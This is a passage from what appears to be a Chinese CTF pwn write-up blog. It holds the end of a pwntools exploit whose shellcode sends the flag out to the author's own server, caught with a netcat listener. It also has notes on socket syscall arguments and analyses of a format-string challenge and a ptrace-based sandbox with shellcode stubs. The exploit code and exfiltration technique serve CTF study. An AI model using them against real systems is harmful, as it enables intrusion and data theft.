&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(shellcode+<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">shell=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		mov rsp, fs:[0x300]</span></span><br><span class="line"><span class="string">		push 0x1000</span></span><br><span class="line"><span class="string">		pop rsi</span></span><br><span class="line"><span class="string">		push 7</span></span><br><span class="line"><span class="string">		pop rdx</span></span><br><span class="line"><span class="string">		push 0xA</span></span><br><span class="line"><span class="string">		pop rax</span></span><br><span class="line"><span class="string">		mov rdi, rsp</span></span><br><span class="line"><span class="string">		and rdi, 0xFFFFFFFFFFFFF000</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		sub rsp,0x67</span></span><br><span class="line"><span class="string">		jmp rsp</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.send(shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>再在服务器上监听对应的端口<code>nc -l 9988</code>,可见顺利接收到了flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/DKI55Y39LLRTHAEB@9BO%7DOX.png" alt=""></p>
<h2 id="socket通信"><a href="#socket通信" class="headerlink" title="socket通信"></a>socket通信</h2><p>只针对这题用到的客户端</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __sys_socket(<span class="type">int</span> family, <span class="type">int</span> type, <span class="type">int</span> protocol)</span><br></pre></td></tr></table></figure>
<p>第一个参数和第三个参数,协议族</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Supported address families. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_UNSPEC	0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_UNIX		1	<span class="comment">/* Unix domain sockets 		*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_LOCAL	1	<span class="comment">/* POSIX name for AF_UNIX	*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_INET		2	<span class="comment">/* Internet IP Protocol 	*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_AX25		3	<span class="comment">/* Amateur Radio AX.25 		*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IPX		4	<span class="comment">/* Novell IPX 			*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_APPLETALK	5	<span class="comment">/* AppleTalk DDP 		*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_NETROM	6	<span class="comment">/* Amateur Radio NET/ROM 	*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_BRIDGE	7	<span class="comment">/* Multiprotocol bridge 	*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ATMPVC	8	<span class="comment">/* ATM PVCs			*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_X25		9	<span class="comment">/* Reserved for X.25 project 	*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_INET6	10	<span class="comment">/* IP version 6			*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ROSE		11	<span class="comment">/* Amateur Radio X.25 PLP	*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_DECnet	12	<span class="comment">/* Reserved for DECnet project	*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_NETBEUI	13	<span class="comment">/* Reserved for 802.2LLC project*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_SECURITY	14	<span class="comment">/* Security callback pseudo AF */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_KEY		15      <span class="comment">/* PF_KEY key management API */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_NETLINK	16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ROUTE	AF_NETLINK <span class="comment">/* Alias to emulate 4.4BSD */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_PACKET	17	<span class="comment">/* Packet family		*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ASH		18	<span class="comment">/* Ash				*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ECONET	19	<span class="comment">/* Acorn Econet			*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ATMSVC	20	<span class="comment">/* ATM SVCs			*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_RDS		21	<span class="comment">/* RDS sockets 			*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_SNA		22	<span class="comment">/* Linux SNA Project (nutters!) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IRDA		23	<span class="comment">/* IRDA sockets			*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_PPPOX	24	<span class="comment">/* PPPoX sockets		*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_WANPIPE	25	<span class="comment">/* Wanpipe API Sockets */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_LLC		26	<span class="comment">/* Linux LLC			*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IB		27	<span class="comment">/* Native InfiniBand address	*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_MPLS		28	<span class="comment">/* MPLS */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_CAN		29	<span class="comment">/* Controller Area Network      */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_TIPC		30	<span class="comment">/* TIPC sockets			*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_BLUETOOTH	31	<span class="comment">/* Bluetooth sockets 		*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IUCV		32	<span class="comment">/* IUCV sockets			*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_RXRPC	33	<span class="comment">/* RxRPC sockets 		*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ISDN		34	<span class="comment">/* mISDN sockets 		*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_PHONET	35	<span class="comment">/* Phonet sockets		*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_IEEE802154	36	<span class="comment">/* IEEE802154 sockets		*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_CAIF		37	<span class="comment">/* CAIF sockets			*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_ALG		38	<span class="comment">/* Algorithm sockets		*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_NFC		39	<span class="comment">/* NFC sockets			*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_VSOCK	40	<span class="comment">/* vSockets			*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_KCM		41	<span class="comment">/* Kernel Connection Multiplexor*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_QIPCRTR	42	<span class="comment">/* Qualcomm IPC Router          */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_SMC		43	<span class="comment">/* smc sockets: reserve number for</span></span></span><br><span class="line"><span class="comment"><span class="meta">				 * PF_SMC protocol family that</span></span></span><br><span class="line"><span class="comment"><span class="meta">				 * reuses AF_INET address family</span></span></span><br><span class="line"><span class="comment"><span class="meta">				 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_XDP		44	<span class="comment">/* XDP sockets			*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_MCTP		45	<span class="comment">/* Management component</span></span></span><br><span class="line"><span class="comment"><span class="meta">				 * transport protocol</span></span></span><br><span class="line"><span class="comment"><span class="meta">				 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_MAX		46	<span class="comment">/* For now.. */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Protocol families, same as address families. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_UNSPEC	AF_UNSPEC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_UNIX		AF_UNIX</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_LOCAL	AF_LOCAL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_INET		AF_INET</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_AX25		AF_AX25</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_IPX		AF_IPX</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_APPLETALK	AF_APPLETALK</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	PF_NETROM	AF_NETROM</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_BRIDGE	AF_BRIDGE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ATMPVC	AF_ATMPVC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_X25		AF_X25</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_INET6	AF_INET6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ROSE		AF_ROSE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_DECnet	AF_DECnet</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_NETBEUI	AF_NETBEUI</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_SECURITY	AF_SECURITY</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_KEY		AF_KEY</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_NETLINK	AF_NETLINK</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ROUTE	AF_ROUTE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_PACKET	AF_PACKET</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ASH		AF_ASH</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ECONET	AF_ECONET</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ATMSVC	AF_ATMSVC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_RDS		AF_RDS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_SNA		AF_SNA</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_IRDA		AF_IRDA</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_PPPOX	AF_PPPOX</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_WANPIPE	AF_WANPIPE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_LLC		AF_LLC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_IB		AF_IB</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_MPLS		AF_MPLS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_CAN		AF_CAN</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_TIPC		AF_TIPC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_BLUETOOTH	AF_BLUETOOTH</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_IUCV		AF_IUCV</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_RXRPC	AF_RXRPC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ISDN		AF_ISDN</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_PHONET	AF_PHONET</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_IEEE802154	AF_IEEE802154</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_CAIF		AF_CAIF</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ALG		AF_ALG</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_NFC		AF_NFC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_VSOCK	AF_VSOCK</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_KCM		AF_KCM</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_QIPCRTR	AF_QIPCRTR</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_SMC		AF_SMC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_XDP		AF_XDP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_MCTP		AF_MCTP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_MAX		AF_MAX</span></span><br></pre></td></tr></table></figure>
<p>第三个参数和第一个是对应的,当然不是说这两个参数要选择完全一样的</p>
<p>第二个参数用于指定TCP或UDP等</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * enum sock_type - Socket types</span></span><br><span class="line"><span class="comment"> * @SOCK_STREAM: stream (connection) socket</span></span><br><span class="line"><span class="comment"> * @SOCK_DGRAM: datagram (conn.less) socket</span></span><br><span class="line"><span class="comment"> * @SOCK_RAW: raw socket</span></span><br><span class="line"><span class="comment"> * @SOCK_RDM: reliably-delivered message</span></span><br><span class="line"><span class="comment"> * @SOCK_SEQPACKET: sequential packet socket</span></span><br><span class="line"><span class="comment"> * @SOCK_DCCP: Datagram Congestion Control Protocol socket</span></span><br><span class="line"><span class="comment"> * @SOCK_PACKET: linux specific way of getting packets at the dev level.</span></span><br><span class="line"><span class="comment"> *		  For writing rarp and other similar things on the user level.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * When adding some new socket type please</span></span><br><span class="line"><span class="comment"> * grep ARCH_HAS_SOCKET_TYPE include/asm-* /socket.h, at least MIPS</span></span><br><span class="line"><span class="comment"> * overrides this enum for binary compat reasons.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">sock_type</span> &#123;</span></span><br><span class="line">	SOCK_STREAM	= <span class="number">1</span>,</span><br><span class="line">	SOCK_DGRAM	= <span class="number">2</span>,</span><br><span class="line">	SOCK_RAW	= <span class="number">3</span>,</span><br><span class="line">	SOCK_RDM	= <span class="number">4</span>,</span><br><span class="line">	SOCK_SEQPACKET	= <span class="number">5</span>,</span><br><span class="line">	SOCK_DCCP	= <span class="number">6</span>,</span><br><span class="line">	SOCK_PACKET	= <span class="number">10</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>像这题使用的是socket(2,1,0)(<u>不知道为什么socket(2,1,2)不行</u>)</p>
<p>之后是<strong>int __sys_connect(int fd, struct sockaddr __user *uservaddr, int addrlen)</strong></p>
<p>第一个参数是之前socket的返回<code>fd</code></p>
<p>第三个一般是<code>0x10</code></p>
<p>第二个</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> &#123;</span></span><br><span class="line">	<span class="type">sa_family_t</span>	sa_family;	<span class="comment">/* address family, AF_xxx	*/</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">char</span> sa_data_min[<span class="number">14</span>];		<span class="comment">/* Minimum 14 bytes of protocol address	*/</span></span><br><span class="line">		DECLARE_FLEX_ARRAY(<span class="type">char</span>, sa_data);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这里用的是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __SOCK_SIZE__	16		<span class="comment">/* sizeof(struct sockaddr)	*/</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">  <span class="type">__kernel_sa_family_t</span>	sin_family;	<span class="comment">/* Address family		*/</span></span><br><span class="line">  __be16		sin_port;	<span class="comment">/* Port number			*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span>	<span class="title">sin_addr</span>;</span>	<span class="comment">/* Internet address		*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Pad to size of `struct sockaddr&#x27;. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>		__pad[__SOCK_SIZE__ - <span class="keyword">sizeof</span>(<span class="type">short</span> <span class="type">int</span>) -</span><br><span class="line">			<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span>) - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> in_addr)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>需要注意协议<code>sin_family</code>是小端</p>
<p><code>sin_port</code>和<code>sin_addr</code>则是大端(网络字节序)</p>
<h1 id="2022鹏城杯-one"><a href="#2022鹏城杯-one" class="headerlink" title="2022鹏城杯-one"></a>2022鹏城杯-one</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">2056</span>]; <span class="comment">// [rsp+0h] [rbp-810h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+808h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x800</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;gift:%p\n&quot;</span>, s);</span><br><span class="line">  login();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now, you can&#x27;t see anything!!!&quot;</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序就是给出一个栈地址,之后关闭标准输出,并给出一个格式化字符串漏洞</p>
<p>主要用到printf函数会在栈上留下一些libc符号信息,例如__IO_2_1_stdout</p>
<p>如果修改printf的返回地址,就有可能使之保留在栈上</p>
<p>之后再次利用格式化字符串将stdout指向stderr,从而恢复正常的输出</p>
<h1 id="Plaid2020-sandybox"><a href="#Plaid2020-sandybox" class="headerlink" title="Plaid2020-sandybox"></a>Plaid2020-sandybox</h1><p>这题实现沙盒的方式有点意思,</p>
<p>以往pwn题实现沙盒一般都是使用seccomp或者prctl相关调用</p>
<p>但是这题是通过ptrace这个调用实现的</p>
<p>开头的sub_1330的作用主要是设置一些cpu相关</p>
<blockquote>
<p>Program does have some <code>rlimits</code> limitations, restricting the cpu usage, file sizes and numer of processes. Nothing interesting.</p>
</blockquote>
<p>之后便是调用fork</p>
<p><strong>子进程</strong></p>
<p>子进程中的<code>prctl(1, 9LL)</code> 的作用是设置当前进程的核心转储行为，使之允许生成核心转储文件。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ptrace(PTRACE_TRACEME, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = __errno_location();</span><br><span class="line">  v5 = strerror(*v4);</span><br><span class="line">  __dprintf_chk(<span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;child traceme %s\n&quot;</span>, v5);</span><br><span class="line">  _exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL)</code>使得子进程暂停并等待父进程trace</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v9 = getpid();</span><br><span class="line">kill(v9, <span class="number">19</span>);</span><br></pre></td></tr></table></figure>
<p>之后发送<code>SIGSTOP</code>信号(我之前一直以为kill是真kill orz)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_D10</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> (*v0)(<span class="type">void</span>); <span class="comment">// r12</span></span><br><span class="line">  <span class="type">void</span> (*v1)(<span class="type">void</span>); <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  syscall(<span class="number">37LL</span>, <span class="number">20LL</span>);</span><br><span class="line">  v0 = (<span class="type">void</span> (*)(<span class="type">void</span>))mmap(<span class="number">0LL</span>, <span class="number">0xA</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  __dprintf_chk(<span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, v1, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      _exit(<span class="number">0</span>);</span><br><span class="line">    v1 = (<span class="type">void</span> (*)(<span class="type">void</span>))((<span class="type">char</span> *)v1 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 != (<span class="type">void</span> (*)(<span class="type">void</span>))((<span class="type">char</span> *)v0 + <span class="number">10</span>) );</span><br><span class="line">  v0();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这就是子进程的真正部分了</p>
<p>读入十个字节并执行,这里要注意当执行到这里时rsi刚好就是v0+10</p>
<p>所以完全可以读入更多shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push 1000</span><br><span class="line">pop rdx</span><br><span class="line">xor eax, eax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<p><strong>父进程</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( waitpid(v3, &amp;stat_loc, <span class="number">0x40000000</span>) &lt; <span class="number">0</span> || (_BYTE)stat_loc != <span class="number">127</span> || BYTE1(stat_loc) != <span class="number">19</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v13 = __errno_location();</span><br><span class="line">  v14 = strerror(*v13);</span><br><span class="line">  __dprintf_chk(<span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;initial waitpid fail 0x%x %s\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)stat_loc, v14);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>waitpid</code> 函数的作用是阻塞当前进程，直到指定的子进程中的一个发生变化为止。变化可能是子进程终止、暂停、继续执行或者被恢复执行等。</p>
<p>stat_loc用于存储信号</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptrace(PTRACE_SETOPTIONS, v12, <span class="number">0LL</span>, <span class="number">0x100000</span>LL);</span><br></pre></td></tr></table></figure>
<p>设置跟踪进程的选项，以便跟踪进程的退出状态</p>
